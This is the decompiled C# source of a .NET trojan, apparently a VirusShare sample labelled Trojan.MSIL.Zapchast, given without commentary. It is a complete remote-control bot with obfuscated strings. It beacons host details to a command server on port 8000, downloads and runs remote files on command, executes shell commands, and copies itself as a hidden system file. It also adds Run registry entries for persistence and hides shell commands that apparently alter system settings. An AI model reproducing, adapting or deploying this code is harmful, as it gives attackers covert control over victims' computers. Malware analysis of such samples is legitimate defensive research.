// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Server, Version=2.4.17.2, Culture=neutral, PublicKeyToken=null
// MVID: F2B9F067-8176-4008-9A63-9489F19DF388
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan.MSIL.Zapchast.aelqe-0cf176827f89ff5167319c15aba7c74d176b0f93dd42f383567faa6c5af2ef21.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;

[StandardModule]
internal sealed class \u000F
{
  private static NetworkStream \u0002;
  private static StreamWriter \u0003;
  private static StreamReader \u0005;
  private static TcpClient \u0008 = new TcpClient();
  private static Thread \u0006 = new Thread(new ThreadStart(\u000F.\u0005));
  private static Thread \u000E = new Thread(new ThreadStart(\u000F.\u000F));
  public static readonly Random \u000F = new Random();
  public static long \u0002\u2000 = (long) \u000F.\u000F.Next(100000000, 999999999);
  private static Mutex \u0003\u2000;
  private static string \u0005\u2000 = \u0002\u2000.\u0002(-543725065);
  private static string \u0008\u2000 = \u0002\u2000.\u0002(-543725101);
  private static bool \u0006\u2000;
  private static string \u000E\u2000 = \u0002\u2000.\u0002(-543725149);
  private static string \u000F\u2000 = \u0002\u2000.\u0002(-543725137);

  [STAThread]
  public static void \u0002()
  {
    Console.WriteLine(\u000F.\u000E\u2000);
    Thread.Sleep(2000);
    \u000F.\u0003(\u000F.\u0005\u2000);
    \u000F.\u000E();
    \u000F.\u0002();
    \u000F.\u0003\u2000();
    \u000F.\u0002((object) \u0008.\u000E);
    Thread.Sleep(1000);
    \u000F.\u0005\u2000();
    \u000F.\u0003();
  }

  public static void \u0003()
  {
    try
    {
      Console.WriteLine(\u0002\u2000.\u0002(-543725129));
      \u000F.\u0008.Connect(\u0002\u2000.\u0002(-543725129), 8000);
      if (\u000F.\u0008.Connected)
      {
        \u000F.\u0002 = \u000F.\u0008.GetStream();
        \u000F.\u0003 = new StreamWriter((Stream) \u000F.\u0002);
        \u000F.\u0005 = new StreamReader((Stream) \u000F.\u0002);
        if (Operators.CompareString(\u0008.\u000E, \u0002\u2000.\u0002(-543725174), false) == 0)
          \u000F.\u0003.WriteLine(\u000F.\u000E\u2000 + \u0002\u2000.\u0002(-543725163) + Conversions.ToString(\u000F.\u0002\u2000) + \u0002\u2000.\u0002(-543725163) + \u0008.\u000E + \u0002\u2000.\u0002(-543725163) + \u000F.\u0002() + \u0002\u2000.\u0002(-543725163) + \u0005.\u0002().Name + \u0002\u2000.\u0002(-543725163) + Conversions.ToString(\u0008.\u0002\u2000));
        else
          \u000F.\u0003.WriteLine(Operators.ConcatenateObject((object) (\u000F.\u000E\u2000 + \u0002\u2000.\u0002(-543725163) + Conversions.ToString(\u000F.\u0002\u2000) + \u0002\u2000.\u0002(-543725163) + \u0008.\u000E + \u0002\u2000.\u0002(-543725163) + \u000F.\u0002() + \u0002\u2000.\u0002(-543725163) + \u0005.\u0002().Name + \u0002\u2000.\u0002(-543725163) + Conversions.ToString(\u0008.\u0002\u2000) + \u0002\u2000.\u0002(-543725163)), \u000F.\u0005()));
        Console.WriteLine(\u000F.\u0002\u2000);
        \u000F.\u0003.Flush();
        \u000F.\u0006.Start();
        \u000F.\u000E.Start();
      }
      else
      {
        Thread.Sleep(5000);
        \u000F.\u0003();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      Console.WriteLine(exception.ToString());
      \u000F.\u0008(exception.ToString());
      Thread.Sleep(5000);
      \u000F.\u0003();
      ProjectData.ClearProjectError();
    }
  }

  private static void \u0005()
  {
    try
    {
      while (\u000F.\u0008.Connected)
      {
        string[] strArray = Strings.Split(\u000F.\u0005.ReadLine(), \u000F.\u0008\u2000);
        string Left = strArray[0];
        if (Operators.CompareString(Left, \u0002\u2000.\u0002(-543725155), false) == 0)
        {
          try
          {
            Random random = new Random();
            Thread.Sleep(new Random().Next(0, 10000));
            string destinationFileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0002\u2000.\u0002(-543725302) + Conversions.ToString(random.Next(100000000, 999999999)) + \u0002\u2000.\u0002(-543725466);
            \u0005.\u0002().Network.DownloadFile(strArray[1], destinationFileName);
            \u000F.\u0005(destinationFileName);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left, \u0002\u2000.\u0002(-543725453), false) == 0)
          \u000F.\u0006();
        else if (Operators.CompareString(Left, \u0002\u2000.\u0002(-543725444), false) == 0)
          \u000F.\u0006\u2000 = true;
        else if (Operators.CompareString(Left, \u0002\u2000.\u0002(-543725495), false) == 0)
        {
          try
          {
            Random random = new Random();
            Thread.Sleep(new Random().Next(0, 10000));
            string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0002\u2000.\u0002(-543725302) + Conversions.ToString(random.Next(100000000, 999999999)) + \u0002\u2000.\u0002(-543725466);
            \u0005.\u0002().Network.DownloadFile(strArray[1], str);
            Process.Start(str);
            \u000F.\u0002(\u0002\u2000.\u0002(-543725486) + \u000F.\u0008\u2000 + \u0002\u2000.\u0002(-543725473) + str);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left, \u0002\u2000.\u0002(-543725521), false) == 0)
          Interaction.Shell(\u0002\u2000.\u0002(-543725512));
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      \u000F.\u0008(exception.ToString());
      Console.WriteLine(exception.ToString());
      \u000F.\u0008();
      ProjectData.ClearProjectError();
    }
  }

  private static void \u0002(string _param0)
  {
    try
    {
      \u000F.\u0003.WriteLine(_param0);
      \u000F.\u0003.Flush();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u000F.\u0008(ex.ToString());
      ProjectData.ClearProjectError();
    }
  }

  public static void \u0008()
  {
    Process.Start(\u0008.\u0003);
    Process.GetCurrentProcess().Kill();
  }

  public static void \u0006()
  {
    try
    {
      if (System.IO.File.Exists(\u0008.\u0003))
        System.IO.File.SetAttributes(\u0008.\u0003, FileAttributes.Normal);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u000F.\u0008(ex.ToString());
      ProjectData.ClearProjectError();
    }
    try
    {
      if (System.IO.File.Exists(\u0008.\u0005))
      {
        System.IO.File.SetAttributes(\u0008.\u0005, FileAttributes.Normal);
        System.IO.File.Delete(\u0008.\u0005);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u000F.\u0008(ex.ToString());
      ProjectData.ClearProjectError();
    }
    try
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\u0002\u2000.\u0002(-543725552), true);
      registryKey.DeleteValue(\u0008.\u0002, false);
      registryKey.Close();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u000F.\u0008(ex.ToString());
      ProjectData.ClearProjectError();
    }
    try
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(\u0002\u2000.\u0002(-543725372), true);
      registryKey.DeleteValue(\u0008.\u0002, false);
      registryKey.Close();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u000F.\u0008(ex.ToString());
      ProjectData.ClearProjectError();
    }
    Process.Start(new ProcessStartInfo()
    {
      FileName = \u0002\u2000.\u0002(-543725384),
      Arguments = \u0002\u2000.\u0002(-543725434) + Assembly.GetExecutingAssembly().Location,
      WindowStyle = ProcessWindowStyle.Hidden
    });
    Process.GetCurrentProcess().Kill();
  }

  public static void \u000E()
  {
    try
    {
      if (!Directory.Exists(\u0008.\u0008))
      {
        try
        {
          Directory.CreateDirectory(\u0008.\u0008);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else
        Console.WriteLine(\u0002\u2000.\u0002(-543724694));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      Console.WriteLine(exception.ToString());
      \u000F.\u0008(exception.ToString());
      ProjectData.ClearProjectError();
    }
    try
    {
      if (Operators.CompareString(Assembly.GetExecutingAssembly().Location, \u0008.\u0003, false) != 0)
      {
        Console.WriteLine(\u0002\u2000.\u0002(-543724733));
        if (System.IO.File.Exists(\u0008.\u0003))
        {
          System.IO.File.SetAttributes(\u0008.\u0003, FileAttributes.Normal);
          System.IO.File.Delete(\u0008.\u0003);
        }
      }
      else
        Console.WriteLine(\u0002\u2000.\u0002(-543724713) + Assembly.GetExecutingAssembly().Location);
      if (Operators.CompareString(Assembly.GetExecutingAssembly().Location, \u0008.\u0005, false) != 0)
      {
        if (System.IO.File.Exists(\u0008.\u0005))
        {
          System.IO.File.SetAttributes(\u0008.\u0005, FileAttributes.Normal);
          System.IO.File.Delete(\u0008.\u0005);
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      Console.WriteLine(exception.ToString());
      \u000F.\u0008(exception.ToString());
      ProjectData.ClearProjectError();
    }
    try
    {
      if (!System.IO.File.Exists(\u0008.\u0003))
      {
        Console.WriteLine(\u0002\u2000.\u0002(-543724755));
        System.IO.File.Copy(Assembly.GetExecutingAssembly().Location, \u0008.\u0003);
        System.IO.File.SetAttributes(\u0008.\u0003, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
        Console.WriteLine(\u0002\u2000.\u0002(-543724737));
        Thread.Sleep(1000);
        \u000F.\u0008();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      Console.WriteLine(exception.ToString());
      \u000F.\u0008(exception.ToString());
      ProjectData.ClearProjectError();
    }
    try
    {
      if (!System.IO.File.Exists(\u0008.\u0005))
      {
        System.IO.File.Copy(Assembly.GetExecutingAssembly().Location, \u0008.\u0005);
        System.IO.File.SetAttributes(\u0008.\u0005, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      Console.WriteLine(exception.ToString());
      \u000F.\u0008(exception.ToString());
      ProjectData.ClearProjectError();
    }
    try
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\u0002\u2000.\u0002(-543724788), true);
      registryKey.SetValue(\u0008.\u0002, (object) \u0008.\u0003);
      registryKey.Close();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      Console.WriteLine(exception.ToString());
      \u000F.\u0008(exception.ToString());
      ProjectData.ClearProjectError();
    }
    try
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(\u0002\u2000.\u0002(-543725372), true);
      registryKey.SetValue(\u0008.\u0002, (object) \u0008.\u0003);
      registryKey.Close();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      Console.WriteLine(exception.ToString());
      \u000F.\u0008(exception.ToString());
      ProjectData.ClearProjectError();
    }
  }

  public static void \u0003(string _param0)
  {
    try
    {
      Mutex.OpenExisting(_param0);
      Process.GetCurrentProcess().Kill();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u000F.\u0008(ex.ToString());
      \u000F.\u0003\u2000 = new Mutex(false, _param0);
      ProjectData.ClearProjectError();
    }
  }

  public static void \u0005(string _param0)
  {
    try
    {
      Process.Start(_param0);
      Process.GetCurrentProcess().Kill();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u000F.\u0008(ex.ToString());
      ProjectData.ClearProjectError();
    }
  }

  public static void \u000F()
  {
    try
    {
      while (true)
      {
        do
        {
          \u000F.\u0006\u2000 = false;
          Thread.Sleep(20000);
        }
        while (\u000F.\u0006\u2000);
        \u000F.\u0008();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u000F.\u0008(ex.ToString());
      ProjectData.ClearProjectError();
    }
  }

  public static object \u0002()
  {
    object obj;
    try
    {
      OperatingSystem osVersion = Environment.OSVersion;
      string str = \u0002\u2000.\u0002(-543724608);
      switch (osVersion.Platform)
      {
        case PlatformID.Win32Windows:
          switch (osVersion.Version.Minor)
          {
            case 0:
              str = \u0002\u2000.\u0002(-543724597);
              break;
            case 10:
              str = \u0002\u2000.\u0002(-543724590);
              break;
            case 90:
              str = \u0002\u2000.\u0002(-543724579);
              break;
          }
          break;
        case PlatformID.Win32NT:
          switch (osVersion.Version.Major)
          {
            case 3:
              str = \u0002\u2000.\u0002(-543724636);
              break;
            case 4:
              str = \u0002\u2000.\u0002(-543724636);
              break;
            case 5:
              if (osVersion.Version.Minor == 0)
              {
                str = \u0002\u2000.\u0002(-543724625);
                break;
              }
              if (osVersion.Version.Minor == 1)
              {
                str = \u0002\u2000.\u0002(-543725174);
                break;
              }
              if (osVersion.Version.Minor == 2)
              {
                str = \u0002\u2000.\u0002(-543724618);
                break;
              }
              break;
            case 6:
              str = \u0002\u2000.\u0002(-543724672);
              if (osVersion.Version.Minor == 0)
              {
                str = \u0002\u2000.\u0002(-543724672);
                break;
              }
              if (osVersion.Version.Minor == 1)
              {
                str = \u0002\u2000.\u0002(-543724661);
                break;
              }
              break;
          }
          break;
      }
      \u0008.\u000E = str;
      Console.WriteLine(str);
      obj = (object) str;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u000F.\u0008(ex.ToString());
      \u0008.\u000E = \u0002\u2000.\u0002(-543724654);
      Console.WriteLine(\u0002\u2000.\u0002(-543724654));
      obj = (object) \u0002\u2000.\u0002(-543724654);
      ProjectData.ClearProjectError();
    }
    return obj;
  }

  public static void \u0002\u2000()
  {
    try
    {
      TcpClient tcpClient = new TcpClient();
      IPEndPoint localEP = new IPEndPoint(IPAddress.Any, Conversions.ToInteger(\u0002\u2000.\u0002(-543724643)));
      if (!\u0008.\u000F)
        return;
      TcpListener tcpListener = new TcpListener(localEP);
      tcpListener.Start();
      tcpClient = tcpListener.AcceptTcpClient();
      new Thread(new ThreadStart(\u000F.\u0005)).Start();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u000F.\u0008(ex.ToString());
      ProjectData.ClearProjectError();
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static void \u0003\u2000()
  {
    try
    {
      if (System.IO.File.Exists(\u0005.\u0002().Info.DirectoryPath + \u0002\u2000.\u0002(-543724951)))
        System.IO.File.Delete(\u0005.\u0002().Info.DirectoryPath + \u0002\u2000.\u0002(-543724951));
      \u0005.\u0002().Network.DownloadFile(\u0002\u2000.\u0002(-543724937), \u0005.\u0002().Info.DirectoryPath + \u0002\u2000.\u0002(-543724951));
      string str1 = \u0005.\u0002().FileSystem.ReadAllText(\u0005.\u0002().Info.DirectoryPath + \u0002\u2000.\u0002(-543724951));
      \u0005.\u0002().FileSystem.DeleteFile(\u0005.\u0002().Info.DirectoryPath + \u0002\u2000.\u0002(-543724951));
      string str2 = Strings.Right(str1, checked (str1.Length - str1.IndexOf(\u0002\u2000.\u0002(-543724970)) - 2));
      string str3 = Strings.Left(str2, str2.IndexOf(\u0002\u2000.\u0002(-543725023)));
      Console.WriteLine(str3.ToString());
      \u0008.\u0003\u2000 = str3.ToString();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u000F.\u0008(ex.ToString());
      ProjectData.ClearProjectError();
    }
  }

  public static string \u0002()
  {
    try
    {
      int tickCount = Environment.TickCount;
      string str = string.Empty;
      int num1 = checked ((int) Math.Round(Conversion.Fix(unchecked ((double) tickCount / 1000.0 / 60.0 / 60.0 / 24.0))));
      if (num1 > 0)
        str = Conversions.ToString(num1) + \u0002\u2000.\u0002(-543725009);
      int num2 = checked (tickCount - num1 * 1000 * 60 * 60 * 24);
      int num3 = checked ((int) Math.Round(Conversion.Fix(unchecked ((double) num2 / 1000.0 / 60.0 / 60.0))));
      if (num3 > 0)
        str = str + Conversions.ToString(num3) + \u0002\u2000.\u0002(-543725001);
      int num4 = checked (num2 - num3 * 1000 * 60 * 60);
      int num5 = checked ((int) Math.Round(Conversion.Fix(unchecked ((double) num4 / 1000.0 / 60.0))));
      if (num5 > 0)
        str = str + Conversions.ToString(num5) + \u0002\u2000.\u0002(-543724993);
      int num6 = checked (num4 - num5 * 1000 * 60);
      int num7 = checked ((int) Math.Round(Conversion.Fix(unchecked ((double) num6 / 1000.0))));
      if (num7 > 0)
        str = str + Conversions.ToString(num7) + \u0002\u2000.\u0002(-543725049);
      int num8 = checked (num6 - num7 * 1000);
      return str;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u000F.\u0008(ex.ToString());
      ProjectData.ClearProjectError();
    }
    return Conversions.ToString(false);
  }

  public static string \u0003()
  {
    try
    {
      string str = (string) null;
      ManagementObjectCollection objectCollection = new ManagementObjectSearcher(\u0002\u2000.\u0002(-543725041) + Environment.MachineName + \u0002\u2000.\u0002(-543725034), \u0002\u2000.\u0002(-543724814)).Get();
      try
      {
        foreach (ManagementBaseObject managementBaseObject in objectCollection)
          str = managementBaseObject[\u0002\u2000.\u0002(-543724839)].ToString();
      }
      finally
      {
        ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
        objectEnumerator?.Dispose();
      }
      return str;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u000F.\u0008(ex.ToString());
      ProjectData.ClearProjectError();
    }
    return Conversions.ToString(false);
  }

  public static string \u0005()
  {
    try
    {
      string Left = (string) null;
      ManagementObjectCollection objectCollection = new ManagementObjectSearcher(\u0002\u2000.\u0002(-543725041) + Environment.MachineName + \u0002\u2000.\u0002(-543725034), \u0002\u2000.\u0002(-543724885)).Get();
      try
      {
        foreach (ManagementBaseObject managementBaseObject in objectCollection)
          Left = managementBaseObject[\u0002\u2000.\u0002(-543724839)].ToString();
      }
      finally
      {
        ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
        objectEnumerator?.Dispose();
      }
      if (Operators.CompareString(Left, string.Empty, false) == 0)
      {
        \u0008.\u0005\u2000 = \u0002\u2000.\u0002(-543724913) + Conversions.ToString(\u000F.\u0002());
        Left = \u0002\u2000.\u0002(-543724913) + Conversions.ToString(\u000F.\u0002());
      }
      \u0008.\u0005\u2000 = Left;
      return Left;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u000F.\u0008(ex.ToString());
      ProjectData.ClearProjectError();
    }
    return Conversions.ToString(false);
  }

  private static bool \u0002()
  {
    bool flag;
    try
    {
      flag = Conversions.ToBoolean(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Interaction.CreateObject(\u0002\u2000.\u0002(-543724904), string.Empty)), (Type) null, \u0002\u2000.\u0002(-543724180), new object[0], (string[]) null, (Type[]) null, (bool[]) null), (Type) null, \u0002\u2000.\u0002(-543724162), new object[0], (string[]) null, (Type[]) null, (bool[]) null)), (Type) null, \u0002\u2000.\u0002(-543724203), new object[0], (string[]) null, (Type[]) null, (bool[]) null));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u000F.\u0008(ex.ToString());
      flag = false;
      ProjectData.ClearProjectError();
    }
    return flag;
  }

  public static object \u0003()
  {
    try
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(\u0002\u2000.\u0002(-543724245));
      object objectValue = RuntimeHelpers.GetObjectValue(registryKey.GetValue(\u0002\u2000.\u0002(-543724053)));
      registryKey.Close();
      return Operators.ConditionalCompareObjectEqual(objectValue, (object) \u0002\u2000.\u0002(-543724037), false) ? (object) \u0002\u2000.\u0002(-543725009) : (object) \u0002\u2000.\u0002(-543724093);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u000F.\u0008(ex.ToString());
      ProjectData.ClearProjectError();
    }
    return (object) false;
  }

  public static void \u0005\u2000()
  {
    try
    {
      if (!\u0008.\u000F)
        return;
      new Thread(new ThreadStart(\u000F.\u0002\u2000)).Start();
      Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
      if (!socket.BeginConnect(\u0008.\u0003\u2000, Conversions.ToInteger(\u0002\u2000.\u0002(-543724643)), (AsyncCallback) null, (object) null).AsyncWaitHandle.WaitOne(10000, false))
      {
        socket.Close();
        Console.WriteLine(\u0002\u2000.\u0002(-543724085));
      }
      else
      {
        socket.Close();
        \u0008.\u0002\u2000 = true;
        Console.WriteLine(\u0002\u2000.\u0002(-543724128));
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u000F.\u0008(ex.ToString());
      ProjectData.ClearProjectError();
    }
  }

  public static void \u0002(object _param0)
  {
    try
    {
      string Left1 = \u000F.\u0005();
      if (Operators.CompareString(Left1, \u0002\u2000.\u0002(-543724110), false) == 0)
      {
        Console.WriteLine(\u0002\u2000.\u0002(-543724158));
        \u0008.\u000F = true;
      }
      else
      {
        if (Operators.CompareString(Left1, \u0002\u2000.\u0002(-543724434), false) != 0)
          return;
        object Left2 = _param0;
        if (Operators.ConditionalCompareObjectEqual(Left2, (object) \u0002\u2000.\u0002(-543725174), false))
        {
          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(\u0002\u2000.\u0002(-543724417), true);
          registryKey.SetValue(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0002\u2000.\u0002(-543724300), (object) (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0002\u2000.\u0002(-543724342)));
          registryKey.Close();
          \u0008.\u000F = true;
          Console.WriteLine(\u0002\u2000.\u0002(-543724361));
        }
        else if (Operators.ConditionalCompareObjectEqual(Left2, (object) \u0002\u2000.\u0002(-543724672), false))
        {
          if (!Operators.ConditionalCompareObjectEqual(\u000F.\u0003(), (object) \u0002\u2000.\u0002(-543725009), false))
            return;
          Console.WriteLine(\u0002\u2000.\u0002(-543723672));
          try
          {
            Interaction.Shell(\u0002\u2000.\u0002(-543723691) + \u0008.\u0003 + string.Empty, AppWinStyle.Hide);
            Interaction.Shell(\u0002\u2000.\u0002(-543723549) + \u0008.\u0003 + string.Empty, AppWinStyle.Hide);
            Interaction.Shell(\u0002\u2000.\u0002(-543723599) + \u0008.\u0003 + string.Empty, AppWinStyle.Hide);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Console.WriteLine(ex.ToString());
            ProjectData.ClearProjectError();
          }
          Thread.Sleep(1000);
          Interaction.Shell(\u0002\u2000.\u0002(-543723965) + \u0008.\u0002.ToLower() + \u0002\u2000.\u0002(-543723982) + \u0008.\u0003.ToLower() + \u0002\u2000.\u0002(-543724019), AppWinStyle.Hide);
          \u0008.\u000F = true;
          Console.WriteLine(\u0002\u2000.\u0002(-543723806));
        }
        else
        {
          if (!Operators.ConditionalCompareObjectEqual(Left2, (object) \u0002\u2000.\u0002(-543724661), false) || !Operators.ConditionalCompareObjectEqual(\u000F.\u0003(), (object) \u0002\u2000.\u0002(-543725009), false))
            return;
          Console.WriteLine(\u0002\u2000.\u0002(-543723672));
          try
          {
            Interaction.Shell(\u0002\u2000.\u0002(-543723691) + \u0008.\u0003 + string.Empty, AppWinStyle.Hide);
            Interaction.Shell(\u0002\u2000.\u0002(-543723549) + \u0008.\u0003 + string.Empty, AppWinStyle.Hide);
            Interaction.Shell(\u0002\u2000.\u0002(-543723599) + \u0008.\u0003 + string.Empty, AppWinStyle.Hide);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Console.WriteLine(ex.ToString());
            ProjectData.ClearProjectError();
          }
          Thread.Sleep(1000);
          Interaction.Shell(\u0002\u2000.\u0002(-543723965) + \u0008.\u0002.ToLower() + \u0002\u2000.\u0002(-543723982) + \u0008.\u0003.ToLower() + \u0002\u2000.\u0002(-543724019), AppWinStyle.Hide);
          \u0008.\u000F = true;
          Console.WriteLine(\u0002\u2000.\u0002(-543723816));
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      Console.WriteLine((object) exception);
      \u000F.\u0008(exception.ToString());
      ProjectData.ClearProjectError();
    }
  }

  public static object \u0005()
  {
    if (!\u0008.\u0005\u2000.Contains(\u0002\u2000.\u0002(-543724913)))
      return (object) \u0008.\u0005\u2000;
    if (Operators.ConditionalCompareObjectEqual(\u000F.\u0003(), (object) \u0002\u2000.\u0002(-543724093), false))
      return (object) \u0002\u2000.\u0002(-543723894);
    return !\u0008.\u0002\u2000 ? (object) \u0002\u2000.\u0002(-543723884) : (object) \u0002\u2000.\u0002(-543725137);
  }

  public static void \u0008(string _param0)
  {
  }

  private delegate void \u0002(string _param1);
}
